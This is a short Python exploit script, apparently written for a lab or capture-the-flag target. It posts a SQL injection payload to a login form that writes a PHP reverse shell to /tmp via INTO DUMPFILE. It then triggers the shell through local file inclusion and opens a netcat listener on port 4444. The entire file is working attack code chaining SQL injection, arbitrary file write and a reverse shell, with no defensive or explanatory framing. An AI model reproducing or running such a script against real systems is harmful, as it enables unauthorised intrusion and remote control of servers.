import requests as req
import time
import sys
import os
import subprocess

dirname = os.path.dirname(__file__)
shelldir = os.path.join(dirname, 'rev_shl2.php')
file1 = open(shelldir,"r")

name = str(int(time.time()))

#Using the inspect element tool to find the parameter names
payload = {'username': ' \' UNION SELECT \'\',\'\' ,\'\' ,\'\' ,\'\' ,\'\' ,\'\' ,\'\' , '+file1.read()+' INTO DUMPFILE \'/tmp/SQLSHELL'+name+'.php\';#',  'password': 'anything', 'submit': 'login'}

#don't use params, the form is configured to use data or files
resp = req.post(url="http://10.14.4.6/users/login.php",data=payload) 

print("Shell uploaded: SQLSHELL"+name)
print("Establishing reverse shell handshake via local file inclusion...")

os.system('gnome-terminal -x python cathandshake.py ' +name)
os.system('nc -nlvp 4444')
#os.system('python cathandshake.py '+name)


